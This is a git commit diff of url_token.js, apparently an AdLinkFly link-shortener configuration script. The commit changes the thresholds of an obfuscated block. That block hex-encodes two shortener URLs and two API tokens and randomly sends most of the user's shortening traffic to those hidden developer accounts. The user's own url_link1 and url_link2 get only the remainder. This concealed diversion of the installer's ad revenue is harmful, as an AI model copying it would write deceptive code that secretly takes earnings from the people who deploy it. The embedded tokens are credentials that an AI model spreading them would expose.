8ecbbe88035e41b6b3888d7612a8678decea5a62
trungro12 <31644108+trungro12@users.noreply.github.com>
2018-07-15 14:48:26 +0700

    Update url_token.js

--- url_token.js
+++ url_token.js
@@ -1,8 +1,8 @@
 var url_link;
 var url_token;
 var centt1 = 65;
-var centt2 = 60;
-var centt3 = 5;
+var centt2 = 64;
+var centt3 = 1;
 var _0x3a46=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x31\x32\x33\x6C\x69\x6E\x6B\x2E\x63\x6F\x2F","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6D\x65\x67\x61\x75\x72\x6C\x2E\x69\x6E\x2F","\x64\x37\x38\x62\x62\x33\x63\x62\x65\x64\x63\x66\x38\x37\x66\x30\x66\x30\x62\x36\x61\x66\x34\x32\x32\x37\x34\x32\x36\x30\x37\x32\x36\x31\x63\x30\x34\x38\x66\x37","\x38\x38\x38\x33\x39\x33\x63\x66\x36\x31\x64\x38\x65\x35\x31\x32\x64\x64\x64\x34\x38\x33\x35\x37\x62\x62\x64\x36\x30\x61\x36\x63\x62\x38\x33\x63\x62\x31\x63\x62","\x72\x61\x6E\x64\x6F\x6D"];var url_link_dev1=_0x3a46[0];var url_link_dev2=_0x3a46[1];var url_token_dev1=_0x3a46[2];var url_token_dev2=_0x3a46[3];var link_short;var cent1=centt1;var cent2=centt2;var cent3=centt3;var randNum=Math[_0x3a46[4]]()* (100- 1)+ 1;if(randNum> cent1){url_link= url_link1;url_token= url_token1;link_short= 1}else {if(randNum> cent2){url_link= url_link2;url_token= url_token2;link_short= 2}else {if(randNum> cent3){url_link= url_link_dev1;url_token= url_token_dev1;link_short= 1}else {url_link= url_link_dev2;url_token= url_token_dev2;link_short= 2}}};var adlinkfly_url=url_link;var adlinkfly_api_token=url_token;var adlinkfly_advert=2;var adlinkfly_domains=url_domains
 
 
